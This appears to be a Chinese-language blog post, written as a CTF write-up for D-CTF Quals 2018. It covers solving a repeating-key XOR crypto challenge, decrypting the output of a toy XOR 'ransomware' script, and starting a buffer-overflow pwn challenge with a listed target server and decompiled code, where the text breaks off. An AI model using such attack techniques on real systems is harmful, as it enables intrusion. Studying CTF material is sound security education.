@@ -1,0 +1,1212 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="threst">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="threst">
+    <meta name="keywords" content="Hexo | threst">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>D-CTFQuals2018 · threst&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180501 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180501 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+        
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />    
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >threst&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">D-CTFQuals2018</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>threst's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/2.png)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            D-CTFQuals2018
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2018/11/02</span>
+                
+                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                    <span class="iconfont-archer">&#xe602;</span>
+                    <span id="busuanzi_value_page_pv"></span>
+                </span>
+                
+                <span class="shareWrapper">
+                    <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                    <span class="shareText">Share</span>
+                    <ul class="shareList">
+                        <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                            <div class="share-qrcode"></div>
+                        </li>
+                        <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                        <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                        <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                        <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                    </ul>
+                </span>
+            </div>
+        
+    </div>
+</div>
+        <script>
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+  
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+      if (postIntroTags) {
+        postIntroTags.classList.add('post-fade-in');
+      }
+      if (postIntroMeat) {
+        postIntroMeat.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="XORnigma"><a href="#XORnigma" class="headerlink" title="XORnigma"></a>XORnigma</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_two_str</span><span class="params">(s, key)</span>:</span></span><br><span class="line">    key = key * (len(s) / len(key) + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(chr(ord(x) ^ ord(y)) <span class="keyword">for</span> (x,y) <span class="keyword">in</span> itertools.izip(s, key)) </span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span> </span><br><span class="line">flag_key = <span class="string">""</span></span><br><span class="line">x = xor_two_str(flag, flag_key)</span><br><span class="line"><span class="keyword">print</span> x.encode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="comment"># 000000003f2537257777312725266c24207062777027307574706672217a67747374642577263077777a3725762067747173377326716371272165722122677522746327743e</span></span><br></pre></td></tr></table></figure>
+<p>查下关于itertools库</p>
+<p><code>izip</code><br><code>izip</code>用于将多个可迭代对象对应位置的元素作为一个元组，将所有元组『组成』一个迭代器，并返回。它的使用形式如下：</p>
+<p><code>izip(iter1, iter2, ..., iterN)</code></p>
+<p>如果某个可迭代对象不再生成值，则迭代停止。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from itertools import izip</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; for item in izip(&apos;ABCD&apos;, &apos;xy&apos;):</span><br><span class="line">...     print item</span><br><span class="line">...</span><br><span class="line">(&apos;A&apos;, &apos;x&apos;)</span><br><span class="line">(&apos;B&apos;, &apos;y&apos;)</span><br><span class="line">&gt;&gt;&gt; for item in izip([1, 2, 3], [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;]):</span><br><span class="line">...     print item</span><br><span class="line">...</span><br><span class="line">(1, &apos;a&apos;)</span><br><span class="line">(2, &apos;b&apos;)</span><br><span class="line">(3, &apos;c&apos;)</span><br></pre></td></tr></table></figure>
+<p>根据这个比赛的规则flag前面都有<code>DCTF</code>这个关键字，再结合前面输出<code>00000000</code>，可以判断这个<code>flag_key</code>就是<code>DCTF</code>，因为一样的异或下就为<code>0</code>了，那么接下来的问题就是猜出其他数字了，根据<code>key * (len(s) / len(key) + 1)</code>可以知道他会一直循环<code>key</code>来加密字符串,<code>00000000</code>之后是<code>3f</code>,我们先将<code>3f</code>转为数字</p>
+<p><code>int(&#39;3f&#39;,16)</code></p>
+<p>输出63,在与<code>D</code>进行异或运算</p>
+<p><code>63 ^ ord(&#39;D&#39;)</code><br>输出123</p>
+<p>那么这个123就是密文的ascii码了,</p>
+<p><code>chr(123)</code></p>
+<p>输出<code>{</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">'000000003f2537257777312725266c24207062777027307574706672217a67747374642577263077777a3725762067747173377326716371272165722122677522746327743e'</span></span><br><span class="line">key = <span class="string">'DCTF'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc.decode(<span class="string">'hex'</span>))):</span><br><span class="line">    flag += chr(ord(enc.decode(<span class="string">'hex'</span>)[i])^ord(key[i%len(key)]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+<p>DCTF{fcc34eaae8bd3614dd30324e932770c3ed139cc2c3250c5b277cb14ea33f77a0}</p>
+<h2 id="Ransomware"><a href="#Ransomware" class="headerlink" title="Ransomware"></a>Ransomware</h2><p>下载来2个文件<code>ransomware.pyc</code>和 <code>youfool!.exe</code>，还原<code>pyc</code>代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesar_cipher</span><span class="params">(buf, password)</span>:</span></span><br><span class="line">    password = password * (len(buf) / len(password) + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> (<span class="string">''</span>).join((chr(ord(x) ^ ord(y)) <span class="keyword">for</span> x, y <span class="keyword">in</span> itertools.izip(buf, password)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'./FlagDCTF.pdf'</span>, <span class="string">'r'</span>)</span><br><span class="line">buf = f.read()</span><br><span class="line">f.close()</span><br><span class="line">allchar = string.ascii_letters + string.punctuation + string.digits</span><br><span class="line">password = (<span class="string">''</span>).join((choice(allchar) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">60</span>)))</span><br><span class="line">buf = caesar_cipher(buf, password)</span><br><span class="line">f = open(<span class="string">'./youfool!.exe'</span>, <span class="string">'w'</span>)</span><br><span class="line">buf = f.write(buf)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+<p>大概意思就是将<code>FlagDCTF.pdf</code>文件与随机60个字符异或加密，输出到<code>youfool!.exe</code>文件中去,那么我们只要找到密码就行了,使用这个<a href="https://wiremask.eu/tools/xor-cracker/" target="_blank" rel="noopener">工具</a>猜出大概密码</p>
+<p><code>:P-@uL&quot;Y1K$[X)fg[|&quot;.45Yq9i&gt;eV)&lt;0C:(&#39;q4n[hGd/EeX+¼7,2O&quot;+:[w</code></p>
+<p>pdf文件头<code>%PDF-1.</code>,文件尾<code>\n%%EOF\n</code></p>
+<p>在使用这个<a href="https://gchq.github.io/CyberChef" target="_blank" rel="noopener">工具</a>,选取他的<code>From hex</code>和<code>XOR</code>模块,</p>
+<p>使用<code>xxd  -ps  youfool\!.exe</code> 将文件十六进制输出</p>
+<p><img src="https://i.loli.net/2018/10/01/5bb210c53d2de.png" alt=""></p>
+<p>由于刚才猜出的密码并不是每个字符都是正确的，所以根据output的关键字修改密码，最后得出密码为<code>:P-@uSL&quot;Y1K$[X)fg[|&quot;.45Yq9i&gt;eV)&lt;0C:(&#39;q4nP[hGd/EeX+E7,2O&quot;+:[2</code>,得到原始文件，上面就是flag</p>
+<p><code>DCTF{d915b5e076215c3efb92e5844ac20d0620d19b15d427e207fae6a3b894f91333}</code></p>
+<h2 id="How-lucky-are-you-pwn"><a href="#How-lucky-are-you-pwn" class="headerlink" title="How lucky are you?(pwn)"></a>How lucky are you?(pwn)</h2><blockquote>
+<p>Target: 167.99.143.206 65031<br>Bin: <a href="https://dctf.def.camp/dctf-18-quals-81249812/lucky" target="_blank" rel="noopener">https://dctf.def.camp/dctf-18-quals-81249812/lucky</a></p>
+</blockquote>
+<p><img src="https://i.loli.net/2018/10/04/5bb5d16ca9498.png" alt="1.png"></p>
+<p>大致功能你输入名字，然后要你猜１００个随机数字，重点是输入名字这里，可以控制从而溢出.</p>
+<p>ida反编译代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v4; <span class="comment">// rsi@2</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax@4</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax@6</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax@7</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v10; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v15; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v16; <span class="comment">// rax@9</span></span><br><span class="line">  __int64 v17; <span class="comment">// rax@9</span></span><br><span class="line">  __int64 v18; <span class="comment">// rax@9</span></span><br><span class="line">  __int64 v19; <span class="comment">// rax@10</span></span><br><span class="line">  __int64 v20; <span class="comment">// rax@10</span></span><br><span class="line">  __int64 v21; <span class="comment">// rax@11</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v22; <span class="comment">// ebx@11</span></span><br><span class="line">  __int64 v23; <span class="comment">// rax@13</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [sp+0h] [bp-540h]@12</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [sp+210h] [bp-330h]@12</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [sp+240h] [bp-300h]@7</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [sp+260h] [bp-2E0h]@7</span></span><br><span class="line">  <span class="keyword">char</span> v29; <span class="comment">// [sp+2D0h] [bp-270h]@7</span></span><br><span class="line">  <span class="keyword">char</span> v30; <span class="comment">// [sp+2F0h] [bp-250h]@1</span></span><br><span class="line">  __int64 v31; <span class="comment">// [sp+3F0h] [bp-150h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [sp+4F8h] [bp-48h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [sp+514h] [bp-2Ch]@9</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [sp+518h] [bp-28h]@9</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v35; <span class="comment">// [sp+51Ch] [bp-24h]@7</span></span><br><span class="line">  __int64 v36; <span class="comment">// [sp+520h] [bp-20h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+52Ch] [bp-14h]@7</span></span><br><span class="line"> </span><br><span class="line">  *(_QWORD *)seed = <span class="number">0L</span>L;</span><br><span class="line">  v36 = <span class="number">8L</span>L;</span><br><span class="line">  v3 = sub_1972(<span class="number">8L</span>L, <span class="number">4L</span>L, a3);</span><br><span class="line">  <span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::basic_ifstream(&amp;v30, <span class="string">"/dev/urandom"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::basic_ios&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>(&amp;v31) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = seed;</span><br><span class="line">    <span class="built_in">std</span>::istream::read((<span class="built_in">std</span>::istream *)&amp;v30, (<span class="keyword">char</span> *)seed, v36);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::basic_ios&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>(&amp;v31) )</span><br><span class="line">    &#123;</span><br><span class="line">      srand(seed[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v5) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cerr</span>, <span class="string">"Failed to read from /dev/urandom"</span>);</span><br><span class="line">      v4 = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;;</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::close(&amp;v30, v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v6) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cerr</span>, <span class="string">"Failed to open /dev/urandom"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  v35 = rand();</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(&amp;v29);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(&amp;v27);</span><br><span class="line">  LODWORD(v7) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Hello, there!"</span>);</span><br><span class="line">  LODWORD(v8) = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  LODWORD(v9) = <span 